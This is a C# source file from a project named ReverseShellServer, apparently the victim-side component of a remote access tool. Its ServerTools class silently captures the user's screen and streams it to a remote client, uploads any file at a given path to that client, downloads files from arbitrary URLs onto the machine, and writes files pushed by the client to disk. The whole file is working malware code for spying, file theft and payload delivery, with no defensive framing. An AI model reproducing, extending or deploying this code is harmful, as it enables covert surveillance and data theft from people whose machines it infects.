using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;

namespace ReverseShellServer
{
    public class ServerTools
    {
        readonly BinaryWriter bw;
        readonly BinaryReader br;
        readonly StreamWriter sw;
        readonly StreamReader sr;

        public ServerTools(BinaryWriter bw, BinaryReader br, StreamWriter sw, StreamReader sr)
        {
            this.bw = bw;
            this.br = br;
            this.sw = sw;
            this.sr = sr;
        }


        public void TakeAndSendScreenShotToClient()
        {
            sw.WriteLine("{Screenshot:init}");
            sw.Flush();
            
            using (var ms = new MemoryStream())
            {
                var bounds = GetScreenRectangle();
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(ms, ImageFormat.Png);
                }


                // Send the data length first
                bw.Write((int)ms.Length);
                bw.Flush();

                // Reset memory stream position
                ms.Position = 0;
                var buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = ms.Read(buffer, 0, buffer.Length)) > 0)
                {
                    bw.Write(buffer, 0, bytesRead);
                }

                bw.Flush();
            }
        }


        static Rectangle GetScreenRectangle()
        {
            try
            {
                // Resolve DPI issue (altered screen resolution)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
                }
            }
            catch (EntryPointNotFoundException)
            {
                // Exception occures if OS does not implement this API, just ignore it
            }

            return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        }


        public void DownloadFileFromUrl(string url)
        {
            sw.WriteLine("{UrlDownload:init}");
            sw.Flush();

            var newFile = url.Split('/').Last();

            var Client = new WebClient();
            try
            {
                Client.DownloadFile(url, newFile);
                sw.WriteLine("Success:" + newFile);
            }
            catch (IOException)
            {
                sw.WriteLine("Error:IO");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(newFile);
                sw.WriteLine("Error:Web");
            }

            sw.Flush();
        }


        public void UploadFileToClient(string path)
        {
            var fileExists = File.Exists(path);
            sw.WriteLine("{UploadFileToClient:init}");
            sw.WriteLine(fileExists.ToString());
            sw.Flush();

            if (!fileExists)
            {
                return;
            }

            try
            {
                using (var readStream = new FileStream(path, FileMode.Open))
                {
                    // Send the data length first
                    bw.Write((int)readStream.Length);
                    bw.Flush();
                    
                    var buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = readStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        bw.Write(buffer, 0, bytesRead);
                    }

                    bw.Flush();
                }
            }
            catch (Exception)
            {
                // Ignore, will be catched on the client's side
            }
        }


        public void ReceiveFileFromClient(string path)
        {
            sw.WriteLine("{ReceiveFileFromClient:init}");
            sw.Flush();

            var dataLength = br.ReadInt32();

            try
            {
                using (var fs = new FileStream(path, FileMode.Create))
                {
                    var buffer = new byte[4096];
                    int bytesRead;
                    var bytesWritten = 0;
                    // test with size of stream data
                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        fs.Write(buffer, 0, bytesRead);
                        bytesWritten += bytesRead;

                        // The file has been totally written
                        if (bytesWritten == dataLength)
                        {
                            break;
                        }
                    }
                }

                sw.WriteLine("Success");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(path);
                sw.WriteLine("Error");
            }

            sw.Flush();
        }


        enum ProcessDPIAwareness
        {
            ProcessDPIUnaware = 0,
            ProcessSystemDPIAware = 1,
            ProcessPerMonitorDPIAware = 2
        }

        [DllImport("shcore.dll")]
        private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
    }
}
